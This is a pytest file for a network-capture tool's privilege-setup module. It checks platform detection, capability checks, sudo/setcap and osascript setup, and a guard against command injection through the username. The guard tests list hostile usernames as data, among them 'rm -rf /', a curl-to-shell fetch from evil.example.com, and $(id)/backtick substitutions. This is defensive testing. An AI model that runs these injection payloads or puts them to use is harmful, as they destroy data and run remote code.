"""
One-time live-capture privilege setup.

This module builds a shell script, interpolates the current username into it, and
runs it with administrator privileges — the highest-consequence code in the
project. It was 45% covered, and every branch that matters is platform-specific,
so on any single machine most of it never runs at all.

The security property under test is the CWE-78 guard: `$USER`/`$LOGNAME` are
attacker-influenceable in a compromised session, and they are interpolated into a
root shell script. Anything outside the safe charset must be refused before a
privileged process is ever spawned.

No test may execute a real privileged command; `subprocess.run` is replaced
everywhere and asserted never to be reached on the rejection paths.
"""

import subprocess

import pytest

from packetiq import capture_setup as cs


@pytest.fixture(autouse=True)
def _never_run_real_commands(monkeypatch):
    """Hard stop: a bug in a test must not spawn osascript or sudo for real."""
    def forbidden(*a, **k):
        raise AssertionError(f"a real subprocess was spawned: {a!r}")

    monkeypatch.setattr(cs.subprocess, "run", forbidden)


# --------------------------------------------------------------------------- #
#  Platform detection                                                           #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("platform,osname,expected", [
    ("darwin", "posix", "mac"),
    ("linux", "posix", "linux"),
    ("linux2", "posix", "linux"),
    ("win32", "nt", "windows"),
    ("freebsd13", "posix", "other"),
])
def test_platform_is_named_from_the_interpreter(platform, osname, expected, monkeypatch):
    monkeypatch.setattr(cs.sys, "platform", platform)
    monkeypatch.setattr(cs.os, "name", osname)
    assert cs.platform_name() == expected


def test_an_unsupported_platform_reports_so_without_claiming_capture_works(monkeypatch):
    monkeypatch.setattr(cs, "platform_name", lambda: "other")
    ok, plat, detail = cs.status()
    assert ok is False
    assert plat == "other"
    assert "Unsupported" in detail


# --------------------------------------------------------------------------- #
#  status() — must never change anything                                        #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("plat,checker", [
    ("mac", "_mac_capture_ok"),
    ("linux", "_linux_capture_ok"),
    ("windows", "_windows_capture_ok"),
])
@pytest.mark.parametrize("capture_ok", [True, False])
def test_status_reports_each_platform_check(plat, checker, capture_ok, monkeypatch):
    monkeypatch.setattr(cs, "platform_name", lambda: plat)
    monkeypatch.setattr(cs, checker, lambda: capture_ok)
    ok, reported, detail = cs.status()
    assert ok is capture_ok
    assert reported == plat
    assert detail.strip()


def test_root_always_counts_as_capture_capable(monkeypatch):
    monkeypatch.setattr(cs.os, "geteuid", lambda: 0, raising=False)
    assert cs._mac_capture_ok() is True
    assert cs._linux_capture_ok() is True


def test_linux_reads_the_interpreter_capabilities(monkeypatch):
    monkeypatch.setattr(cs.os, "geteuid", lambda: 1000, raising=False)
    monkeypatch.setattr(
        cs.subprocess, "run",
        lambda *a, **k: subprocess.CompletedProcess(a[0], 0, "python = cap_net_raw+eip\n", ""),
    )
    assert cs._linux_capture_ok() is True


def test_linux_without_capabilities_reports_not_enabled(monkeypatch):
    monkeypatch.setattr(cs.os, "geteuid", lambda: 1000, raising=False)
    monkeypatch.setattr(
        cs.subprocess, "run",
        lambda *a, **k: subprocess.CompletedProcess(a[0], 0, "", ""),
    )
    assert cs._linux_capture_ok() is False


def test_a_missing_getcap_binary_is_not_fatal(monkeypatch):
    monkeypatch.setattr(cs.os, "geteuid", lambda: 1000, raising=False)

    def missing(*a, **k):
        raise FileNotFoundError("getcap")

    monkeypatch.setattr(cs.subprocess, "run", missing)
    assert cs._linux_capture_ok() is False


def test_npcap_is_detected_from_its_install_locations(monkeypatch):
    seen = []

    class FakePath:
        def __init__(self, p):
            seen.append(p)
            self.p = p

        def exists(self):
            return self.p == r"C:\Program Files\Npcap"

    monkeypatch.setattr(cs, "Path", FakePath)
    assert cs._npcap_installed() is True
    assert len(seen) >= 1


def test_npcap_absent_is_reported_as_absent(monkeypatch):
    class FakePath:
        def __init__(self, p):
            pass

        def exists(self):
            return False

    monkeypatch.setattr(cs, "Path", FakePath)
    assert cs._npcap_installed() is False


# --------------------------------------------------------------------------- #
#  The CWE-78 username guard                                                    #
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize("hostile", [
    "user; rm -rf /",
    "user' && curl evil.example.com | sh #",
    "user`whoami`",
    "user$(id)",
    'user"',
    "user\nroot",
    "user with spaces",
    "",
    "a" * 33,                       # over the length cap
    "üser",                         # non-ASCII
])
def test_a_hostile_username_is_refused_before_anything_privileged_runs(hostile, monkeypatch):
    """$USER is interpolated into a root shell script — this is the only guard."""
    monkeypatch.setenv("USER", hostile)
    monkeypatch.setenv("LOGNAME", hostile)
    ok, msg = cs._mac_setup()          # subprocess.run raises if reached
    assert ok is False
    assert "safe username" in msg


@pytest.mark.parametrize("safe", ["jay", "user_1", "first.last", "a-b", "A" * 32])
def test_an_ordinary_username_is_accepted(safe, monkeypatch):
    monkeypatch.setenv("USER", safe)
    calls = {}

    def fake_run(argv, **kw):
        calls["argv"] = argv
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(cs.subprocess, "run", fake_run)
    ok, msg = cs._mac_setup()

    assert ok is True
    assert calls["argv"][0] == "osascript"
    assert "with administrator privileges" in calls["argv"][2]
    assert safe in calls["argv"][2]


def test_the_privileged_script_is_passed_as_argv_never_through_a_shell(monkeypatch):
    monkeypatch.setenv("USER", "jay")
    seen = {}

    def fake_run(argv, **kw):
        seen.update(kw)
        seen["argv"] = argv
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(cs.subprocess, "run", fake_run)
    cs._mac_setup()

    assert isinstance(seen["argv"], list)
    assert seen.get("shell") is not True
    assert seen.get("timeout")            # a hung admin prompt must not block forever


def test_cancelling_the_admin_prompt_reports_no_changes(monkeypatch):
    monkeypatch.setenv("USER", "jay")
    monkeypatch.setattr(
        cs.subprocess, "run",
        lambda argv, **kw: subprocess.CompletedProcess(argv, 1, "", "User canceled."),
    )
    ok, msg = cs._mac_setup()
    assert ok is False
    assert "Cancelled" in msg
    assert "no changes" in msg.lower()


def test_a_failing_setup_reports_the_reason(monkeypatch):
    monkeypatch.setenv("USER", "jay")
    monkeypatch.setattr(
        cs.subprocess, "run",
        lambda argv, **kw: subprocess.CompletedProcess(argv, 1, "", "something broke"),
    )
    ok, msg = cs._mac_setup()
    assert ok is False
    assert "something broke" in msg


def test_osascript_being_unavailable_is_reported_not_raised(monkeypatch):
    monkeypatch.setenv("USER", "jay")

    def missing(*a, **k):
        raise FileNotFoundError("osascript")

    monkeypatch.setattr(cs.subprocess, "run", missing)
    ok, msg = cs._mac_setup()
    assert ok is False
    assert "failed to launch" in msg


# --------------------------------------------------------------------------- #
#  Linux setup                                                                  #
# --------------------------------------------------------------------------- #

def test_linux_setup_needs_setcap_and_says_how_to_get_it(monkeypatch):
    monkeypatch.setattr(cs.shutil, "which", lambda name: None)
    ok, msg = cs._linux_setup()
    assert ok is False
    assert "libcap" in msg


def test_linux_setup_grants_cap_net_raw_to_the_interpreter(monkeypatch):
    monkeypatch.setattr(cs.shutil, "which", lambda name: f"/usr/bin/{name}")
    calls = {}

    def fake_run(argv, **kw):
        calls["argv"] = argv
        return subprocess.CompletedProcess(argv, 0, "", "")

    monkeypatch.setattr(cs.subprocess, "run", fake_run)
    ok, msg = cs._linux_setup()

    assert ok is True
    assert calls["argv"][0] == "sudo"
    assert "setcap" in calls["argv"]
    assert "cap_net_raw,cap_net_admin+eip" in calls["argv"]


def test_linux_setup_works_without_sudo_when_already_root(monkeypatch):
    monkeypatch.setattr(cs.shutil, "which", lambda name: None if name == "sudo" else "/usr/sbin/setcap")
    calls = {}
    monkeypatch.setattr(cs.subprocess, "run",
                        lambda argv, **kw: (calls.update(argv=argv),
                                            subprocess.CompletedProcess(argv, 0, "", ""))[1])
    ok, _ = cs._linux_setup()
    assert ok is True
    assert calls["argv"][0] == "setcap"


def test_a_failing_setcap_reports_stderr(monkeypatch):
    monkeypatch.setattr(cs.shutil, "which", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(
        cs.subprocess, "run",
        lambda argv, **kw: subprocess.CompletedProcess(argv, 1, "", "Operation not permitted"),
    )
    ok, msg = cs._linux_setup()
    assert ok is False
    assert "Operation not permitted" in msg


# --------------------------------------------------------------------------- #
#  setup() dispatch                                                             #
# --------------------------------------------------------------------------- #

def test_setup_makes_no_changes_when_capture_already_works(monkeypatch):
    monkeypatch.setattr(cs, "status", lambda: (True, "mac", "already fine"))
    ok, msg = cs.setup()               # subprocess.run raises if reached
    assert ok is True
    assert "already enabled" in msg


@pytest.mark.parametrize("plat,target", [("mac", "_mac_setup"), ("linux", "_linux_setup")])
def test_setup_dispatches_to_the_right_platform(plat, target, monkeypatch):
    monkeypatch.setattr(cs, "status", lambda: (False, plat, "not yet"))
    monkeypatch.setattr(cs, target, lambda: (True, "done"))
    assert cs.setup() == (True, "done")


def test_windows_setup_explains_the_npcap_reinstall(monkeypatch):
    monkeypatch.setattr(cs, "status", lambda: (False, "windows", "no"))
    monkeypatch.setattr(cs, "_npcap_installed", lambda: True)
    ok, msg = cs.setup()
    assert ok is False
    assert "Restrict to Administrators" in msg


def test_windows_setup_points_at_the_npcap_download_when_absent(monkeypatch):
    monkeypatch.setattr(cs, "status", lambda: (False, "windows", "no"))
    monkeypatch.setattr(cs, "_npcap_installed", lambda: False)
    ok, msg = cs.setup()
    assert ok is False
    assert "npcap.com" in msg


def test_setup_on_an_unsupported_platform_still_returns_a_pair(monkeypatch):
    """Callers unpack the result; a bare `return` here would crash them."""
    monkeypatch.setattr(cs, "status", lambda: (False, "other", "no"))
    ok, msg = cs.setup()
    assert ok is False
    assert "supported" in msg
